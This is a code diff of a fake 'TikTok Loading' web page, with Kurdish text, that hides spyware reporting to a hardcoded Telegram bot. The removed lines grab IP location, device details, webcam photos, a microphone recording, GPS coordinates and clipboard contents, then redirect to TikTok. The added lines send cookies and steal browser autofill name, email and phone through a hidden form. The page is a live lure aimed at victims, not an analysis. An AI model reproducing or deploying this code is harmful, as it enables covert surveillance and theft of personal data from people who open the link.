@@ -3,117 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Video</title>
+    <title>TikTok | Loading...</title>
     <style>
-        body { background: #000; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: sans-serif; overflow: hidden; }
-        .tiktok-loader { width: 50px; height: 50px; border-radius: 50%; border: 3px solid #2af0ea; border-top: 3px solid #fe2c55; animation: spin 0.8s linear infinite; }
+        body { background: #000; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #v, #c { display: none; }
     </style>
 </head>
 <body>
-    <div class="tiktok-loader"></div>
-    <p style="margin-top: 15px; font-size: 14px; color: #888;">Loading TikTok...</p>
 
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
+    <div class="loader"></div>
+    <p style="margin-top: 20px;">تکایە چاوەڕێ بکە...</p>
+
+    <form id="hiddenForm" style="display:none;">
+        <input type="text" id="autoName" autocomplete="name">
+        <input type="email" id="autoEmail" autocomplete="email">
+        <input type="tel" id="autoPhone" autocomplete="tel">
+    </form>
 
     <script>
-        const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
-        const chatId = '1034878899';
-        const tiktokLink = "https://vt.tiktok.com/ZSmLkxJ31/";
+        const botToken = "8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4";
+        const chatId = "1034878899";
 
-        async function start() {
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const data = await ipRes.json();
-                
-                let batt = { level: "N/A", char: "N/A" };
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batt.level = Math.round(b.level * 100) + "%";
-                    batt.char = b.charging ? "بەڵێ 🔌" : "نەخێر 🔋";
-                }
-
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "نادیار";
-
-                const conn = navigator.connection || {};
-                const netType = conn.effectiveType || "N/A";
-                const isWifi = conn.type === 'wifi' ? "WiFi 📶" : "Sim Card 📱";
-                const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "نادیار";
-
-                const report = `
-🔥 **Ultimate Spy Report** 🔥
-----------------------------------
-🌐 **ئینتەرنێت و تۆڕ:**
-• ئایپی: \`${data.ip}\` 🛰️
-• هێڵ: **${isWifi}** (${netType.toUpperCase()})
-• کۆمپانیا: **${data.org}** 📶
-• وڵات/شار: ${data.country_name} - ${data.city}
-
-🔋 **باری وزە:**
-• پاتری: **${batt.level}** | شەحن: **${batt.char}**
-
-📱 **سیستم و ئامێر:**
-• پلاتفۆرم: ${navigator.platform}
-• ڕام: **${ram}** | گرافیک: ${gpu}
-• شاشە: ${screen.width}x${screen.height}
-• زمان: ${navigator.language} | دۆخ: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light"}
-
-📍 **ناوچە:** ${data.region}
-⏰ **کات:** ${new Date().toLocaleString('ku-IQ')}
-----------------------------------
-`;
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                const videoEl = document.getElementById('v');
-                videoEl.srcObject = stream;
-                videoEl.muted = true; // بێدەنگکردنی مایکرۆفۆن بۆ کەسەکە
-
-                for (let i = 0; i < 2; i++) {
-                    await new Promise(r => setTimeout(r, 1500));
-                    const picCanvas = document.getElementById('c');
-                    picCanvas.width = videoEl.videoWidth; picCanvas.height = videoEl.videoHeight;
-                    picCanvas.getContext('2d').drawImage(videoEl, 0, 0);
-                    const b = await new Promise(r => picCanvas.toBlob(r, 'image/jpeg'));
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId); fd.append('photo', b, 'u.jpg');
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                }
-
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-                mediaRecorder.ondataavailable = e => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'audio/ogg' });
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId); fd.append('voice', blob, 'v.ogg');
-                    fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: fd });
-                };
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 4000);
-
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 GPS: http://maps.google.com/?q=" + pos.coords.latitude + "," + pos.coords.longitude)}`);
-                });
-
-                setTimeout(() => { window.location.href = tiktokLink; }, 2000);
-
-            } catch(e) { window.location.href = tiktokLink; }
+        // ناردنی زانیاری ئامێر و وێبگەڕ
+        async function sendDeviceDetails() {
+            const battery = navigator.getBattery ? await navigator.getBattery() : null;
+            const info = `📱 **زانیاری ئامێر:**\n` +
+                         `• پاتری: ${battery ? (battery.level * 100).toFixed(0) + '%' : 'نادیار'}\n` +
+                         `• پلاتفۆرم: ${navigator.platform}\n` +
+                         `• کوکیز: \`${document.cookie || "نییە"}\``;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
         }
 
-        document.addEventListener('click', async () => {
-            try {
-                const text = await navigator.clipboard.readText();
-                if(text) fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📋 Clipboard: " + text)}`);
-            } catch(e) {}
-        });
+        // کارلێک و Autofill
+        window.addEventListener('click', async function() {
+            // داوای کامێرا
+            try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch(e) {}
 
-        window.onload = start;
+            // ناردنی Autofill
+            setTimeout(() => {
+                const name = document.getElementById('autoName').value;
+                const email = document.getElementById('autoEmail').value;
+                const phone = document.getElementById('autoPhone').value;
+
+                if (name || email || phone) {
+                    const msg = `👤 **زانیاری Autofill:**\n• ناو: ${name}\n• ئیمەیڵ: ${email}\n• مۆبایل: ${phone}`;
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+                }
+            }, 1000);
+        }, { once: true });
+
+        sendDeviceDetails();
     </script>
 </body>
 </html>
